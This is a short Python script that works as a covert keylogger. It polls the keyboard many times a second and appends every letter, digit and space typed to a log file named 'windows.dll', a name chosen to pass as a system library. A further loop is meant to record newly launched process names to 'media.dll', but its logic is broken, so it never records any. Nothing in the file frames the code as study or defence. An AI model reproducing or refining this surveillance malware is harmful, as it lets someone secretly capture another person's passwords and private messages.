import keyboard
from time import sleep 
import psutil




rabota = True 
file = open("windows.dll","w")
file.write("zapusk---")
file.close()
processi = []


while rabota == True:
    sleep(1 / 15)
    if keyboard.is_pressed("q"):
        file = open("windows.dll","a")
        file.write("q")
        file.close()

    if keyboard.is_pressed("w"):
        file = open("windows.dll","a")
        file.write("w")
        file.close()

    if keyboard.is_pressed("e"):
        file = open("windows.dll","a")
        file.write("e")
        file.close()

    if keyboard.is_pressed("r"):
        file = open("windows.dll","a")
        file.write("r")
        file.close()

    if keyboard.is_pressed("t"):
        file = open("windows.dll","a")
        file.write("t")
        file.close()

    if keyboard.is_pressed("y"):
        file = open("windows.dll","a")
        file.write("y")
        file.close()

    if keyboard.is_pressed("u"):
        file = open("windows.dll","a")
        file.write("u")
        file.close()

    if keyboard.is_pressed("i"):
        file = open("windows.dll","a")
        file.write("i")
        file.close()
    
    if keyboard.is_pressed("o"):
        file = open("windows.dll","a")
        file.write("o")
        file.close()

    if keyboard.is_pressed("p"):
        file = open("windows.dll","a")
        file.write("p")
        file.close()

    if keyboard.is_pressed("a"):
        file = open("windows.dll","a")
        file.write("a")
        file.close()

    if keyboard.is_pressed("s"):
        file = open("windows.dll","a")
        file.write("s")
        file.close()

    if keyboard.is_pressed("d"):
        file = open("windows.dll","a")
        file.write("d")
        file.close()

    if keyboard.is_pressed("f"):
        file = open("windows.dll","a")
        file.write("f")
        file.close()

    if keyboard.is_pressed("g"):
        file = open("windows.dll","a")
        file.write("g")
        file.close()

    if keyboard.is_pressed("h"):
        file = open("windows.dll","a")
        file.write("h")
        file.close()    
    if keyboard.is_pressed("j"):
        file = open("windows.dll","a")
        file.write("j")
        file.close()

    if keyboard.is_pressed("k"):
        file = open("windows.dll","a")
        file.write("k")
        file.close()

    if keyboard.is_pressed("l"):
        file = open("windows.dll","a")
        file.write("l")
        file.close()

    if keyboard.is_pressed("z"):
        file = open("windows.dll","a")
        file.write("z")
        file.close()

    if keyboard.is_pressed("x"):
        file = open("windows.dll","a")
        file.write("x")
        file.close()

    if keyboard.is_pressed("c"):
        file = open("windows.dll","a")
        file.write("c")
        file.close()

    if keyboard.is_pressed("v"):
        file = open("windows.dll","a")
        file.write("v")
        file.close()

    if keyboard.is_pressed("b"):
        file = open("windows.dll","a")
        file.write("b")
        file.close()
    
    if keyboard.is_pressed("n"):
        file = open("windows.dll","a")
        file.write("n")
        file.close()

    if keyboard.is_pressed("m"):
        file = open("windows.dll","a")
        file.write("m")
        file.close()

####--------------------------------------------------

    if keyboard.is_pressed("1"):
        file = open("windows.dll","a")
        file.write("1")
        file.close()

    if keyboard.is_pressed("2"):
        file = open("windows.dll","a")
        file.write("2")
        file.close()

    if keyboard.is_pressed("3"):
        file = open("windows.dll","a")
        file.write("3")
        file.close()

    if keyboard.is_pressed("4"):
        file = open("windows.dll","a")
        file.write("4")
        file.close()

    if keyboard.is_pressed("5"):
        file = open("windows.dll","a")
        file.write("5")
        file.close()

    if keyboard.is_pressed("6"):
        file = open("windows.dll","a")
        file.write("6")
        file.close()


    if keyboard.is_pressed("7"):
        file = open("windows.dll","a")
        file.write("7")
        file.close()

    if keyboard.is_pressed("8"):
        file = open("windows.dll","a")
        file.write("8")
        file.close()

    if keyboard.is_pressed("9"):
        file = open("windows.dll","a")
        file.write("9")
        file.close()

    if keyboard.is_pressed("0"):
        file = open("windows.dll","a")
        file.write("0")
        file.close()

    if keyboard.is_pressed("space"):
        file = open("windows.dll","a")
        file.write(" ")
        file.close()
###------------------------------------------------


    for proc in psutil.process_iter():
        name = proc.name()
        processi.append(name)



    for proc in psutil.process_iter():
        name = proc.name()

        if not name in processi:
            try:
                file = open("media.dll","a")
                file.write("\n has Run: ")
                file.write(name)
                file.close()
            except BaseException:
                pass
